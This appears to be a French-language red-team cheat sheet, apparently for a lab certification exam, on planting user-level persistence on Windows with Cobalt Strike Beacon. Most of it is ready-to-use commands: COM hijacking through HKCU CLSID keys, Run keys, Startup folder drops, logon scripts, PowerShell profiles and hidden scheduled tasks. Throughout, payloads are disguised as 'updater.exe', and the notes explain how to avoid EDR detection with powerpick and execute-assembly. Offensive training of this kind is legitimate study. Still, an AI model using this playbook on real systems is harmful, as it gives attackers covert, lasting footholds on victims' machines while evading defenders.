# Persistence — Contexte utilisateur

> Ces techniques de **Persistence** s'exécutent dans le contexte utilisateur, sans privilèges administrateur. Pour la persistence élevée, voir `cheatsheets/elevated-persistence.md`.
> **Important pour l'examen :** mettre en place la persistence avant une pause. L'option Save Progress ne préserve pas les Beacons actifs ni les chaînes P2P.

---

## Classement OPSEC

| Technique | OPSEC | Déclencheur | Admin requis |
|-----------|-------|---------|-------------|
| COM Hijacking (HKCU) | SAFE | Chargement d'une application | Non |
| Logon Script (clé Environment HKCU) | CAUTION | Connexion utilisateur | Non |
| PowerShell Profile | CAUTION | Ouverture d'une fenêtre PS | Non |
| Scheduled Task | CAUTION | Connexion / horaire / événement | Non |
| Registry Run Key | UNSAFE | Connexion utilisateur | Non |
| Startup Folder | UNSAFE | Connexion utilisateur | Non |

> **Ordre de préférence indiqué pour l'examen :** COM Hijack → Logon Script → Scheduled Task → Registry Run Key.

---

## COM Hijacking (HKCU) — OPSEC-SAFE

Méthode de persistence privilégiée dans ces notes : écriture dans HKCU uniquement (sans admin), sans création de Scheduled Task ni d'événement associé à une Run Key.

**Rechercher les possibilités de hijack avec ProcMon :**
```
Operation = RegOpenKey
Path contains CLSID
Result = NAME NOT FOUND
```
Exporter le CSV, analyser les fréquences et rechercher un CLSID chargé occasionnellement plutôt que des milliers de fois par minute.

**Vérifier qu'un CLSID existe dans HKLM mais pas dans HKCU — cas potentiellement hijackable :**
```powershell
# In HKLM (exists):
Get-Item "HKLM:\Software\Classes\CLSID\{<CLSID>}"

# Not in HKCU (hijackable):
Get-Item "HKCU:\Software\Classes\CLSID\{<CLSID>}"
# Error = does not exist = hijackable
```

**Configurer le COM hijack :**
```powershell
# Point HKCU CLSID → your DLL payload (in a writable, allowed path)
$clsid = '{<CLSID from procmon>}'
$dll   = 'C:\Users\pchilds\AppData\Local\payload.dll'

New-Item    -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Value $dll -Force
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" `
                 -Name 'ThreadingModel' -Value 'Both' -Force
```

**Déclencheur :** fermer puis rouvrir la session. L'application qui charge l'objet COM (par exemple `DllHost.exe`) charge alors la DLL et peut déclencher un nouveau callback Beacon.

**Commandes du Beacon Cobalt Strike :**
```cs
// Upload DLL payload to target first
beacon> upload C:\Payloads\http_x64.dll
beacon> mv http_x64.dll C:\Users\pchilds\AppData\Local\payload.dll

// Set registry (reg_set syntax: host:optional  hive  key  value  type  data)
beacon> reg_set HKCU Software\Classes\CLSID\{<CLSID>}\InprocServer32 "" REG_SZ C:\Users\pchilds\AppData\Local\payload.dll
beacon> reg_set HKCU Software\Classes\CLSID\{<CLSID>}\InprocServer32 ThreadingModel REG_SZ Both
```

**Supprimer après utilisation :**
```cs
beacon> reg_delete HKCU Software\Classes\CLSID\{<CLSID>}
```

---

## Registry Run Keys — OPSEC-CAUTION

Persistence après redémarrage : exécution à chaque connexion utilisateur. Les Run Keys sont des points de détection connus, surveillés par les EDR et Defender.

**Emplacements Registry en contexte utilisateur (sans admin) :**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run       ← persistent (every logon)
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce  ← deleted after first run
```

**Déposer d'abord le payload dans un chemin peu visible :**
```cs
beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
```

**Configurer la Run Key :**
```cs
// reg_set syntax: hive  key  value  type  data
beacon> reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_SZ C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe

// Verify
beacon> reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run
```

**Suppression :**
```cs
beacon> reg_delete HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater
```

---

## Startup Folder — OPSEC-CAUTION

Les exécutables placés dans le Startup Folder se lancent à la connexion utilisateur. C'est une technique simple mais très visible.

**Chemin :**
```
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
```

```cs
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe "C:\Users\pchilds\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
```

**Suppression :**
```cs
beacon> rm "C:\Users\pchilds\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
```

---

## Logon Script — Clé Environment HKCU

La valeur `UserInitMprLogonScript` de la clé Registry Environment permet de lancer un programme à la connexion utilisateur.

```cs
beacon> reg_set HKCU Environment UserInitMprLogonScript REG_SZ C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe
```

**Suppression :**
```cs
beacon> reg_delete HKCU Environment UserInitMprLogonScript
```

---

## PowerShell Profile

Le script `$PROFILE` est exécuté lorsqu'une nouvelle fenêtre PowerShell est ouverte par l'utilisateur.

**Chemin du profil Windows PowerShell :**
```
C:\Users\<user>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
```

**Contenu du profil : utiliser Start-Job pour ne pas bloquer l'invite PowerShell :**
```powershell
Start-Job -ScriptBlock {
    Start-Sleep -Seconds 5
    & "C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe"
}
```

```cs
// Upload profile (creates dir if needed)
beacon> mkdir C:\Users\pchilds\Documents\WindowsPowerShell
beacon> upload C:\Payloads\Microsoft.PowerShell_profile.ps1
beacon> mv Microsoft.PowerShell_profile.ps1 C:\Users\pchilds\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
```

> **Ne pas placer de code bloquant dans le profil** : l'utilisateur ne retrouvera l'invite PowerShell qu'après la fin du script.

**Suppression :**
```cs
beacon> rm C:\Users\pchilds\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
```

---

## Scheduled Task — OPSEC-CAUTION

Task Scheduler accepte plusieurs déclencheurs : connexion, démarrage, inactivité, horaire ou événement système.

**Template XML de tâche (déclenchement à la connexion) :**
```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe</Command>
    </Exec>
  </Actions>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Hidden>true</Hidden>
  </Settings>
</Task>
```

```cs
// Upload XML to target, then create task
beacon> upload C:\Payloads\task.xml
beacon> shell schtasks /create /tn \Beacon /xml task.xml     // OPSEC-UNSAFE — spawns cmd.exe
beacon> run schtasks /create /tn \Beacon /xml task.xml       // OPSEC-CAUTION — no cmd.exe, still spawns proc
// Task name must start with \
```

**Alternative OPSEC-SAFE — objet COM via powerpick (sans schtasks.exe ni child process) :**
```cs
beacon> powerpick $action = New-ScheduledTaskAction -Execute 'C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe'; Register-ScheduledTask -TaskName 'Updater' -Action $action -RunLevel Highest
```

**Alternatives d'énumération OPSEC-SAFE :**
```cs
// Seatbelt via execute-assembly (in-memory, no child process)
beacon> execute-assembly Seatbelt.exe ScheduledTasks

// powerpick (no powershell.exe spawned)
beacon> powerpick Get-ScheduledTask | Select TaskName,TaskPath,State | Format-List
```

> **Event ID généré lors de la création d'une tâche :** `4698` (nouvelle Scheduled Task), enregistré sur l'hôte local.
> Le lancement de `schtasks.exe` comme child process du Beacon est identifiable par l'EDR. Ces notes privilégient `powerpick` ou `execute-assembly` pendant l'examen.

**Suppression :**
```cs
beacon> shell schtasks /delete /tn \Beacon /f               // OPSEC-UNSAFE
beacon> run schtasks /delete /tn \Beacon /f                 // OPSEC-CAUTION
// OPSEC-SAFE remove:
beacon> powerpick Unregister-ScheduledTask -TaskName 'Updater' -Confirm:$false
```

---

## Workflow Persistence pour l'examen

```
1. After first Beacon checks in — immediately set persistence before anything else
2. Choose COM Hijacking first:
   a. Run procmon on a lab clone → find low-frequency CLSID missing from HKCU
   b. Upload DLL payload → set HKCU CLSID registry entries
   c. Verify: log out/in → second Beacon checks in
3. If COM hijack unavailable → fallback to Scheduled Task (logon trigger)
4. Before ANY break → confirm persistence beacon is still checking in
5. Document the CLSID / key used → reg_delete it when persistence is no longer needed
```

---

## Référence rapide

```
COM HIJACK:    reg_set HKCU Software\Classes\CLSID\{GUID}\InprocServer32 "" REG_SZ <dll_path>
               reg_set HKCU Software\Classes\CLSID\{GUID}\InprocServer32 ThreadingModel REG_SZ Both

RUN KEY:       reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run <name> REG_SZ <exe_path>

STARTUP:       upload payload → mv to C:\Users\<user>\AppData\Roaming\...\Startup\

LOGON SCRIPT:  reg_set HKCU Environment UserInitMprLogonScript REG_SZ <exe_path>

PS PROFILE:    upload profile.ps1 → mv to Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1

SCHED TASK:    upload task.xml → shell schtasks /create /tn \Beacon /xml task.xml  [UNSAFE]
               run schtasks /create /tn \Beacon /xml task.xml                        [CAUTION]
               powerpick Register-ScheduledTask ...                                  [SAFE]

ENUM TASK:     execute-assembly Seatbelt.exe ScheduledTasks                         [SAFE]
               powerpick Get-ScheduledTask | Select TaskName,TaskPath,State          [SAFE]

REMOVE COM:    reg_delete HKCU Software\Classes\CLSID\{GUID}
REMOVE RUN:    reg_delete HKCU Software\Microsoft\Windows\CurrentVersion\Run <name>
REMOVE TASK:   shell schtasks /delete /tn \Beacon /f  [UNSAFE] | powerpick Unregister-ScheduledTask -TaskName 'Updater' -Confirm:$false  [SAFE]
```
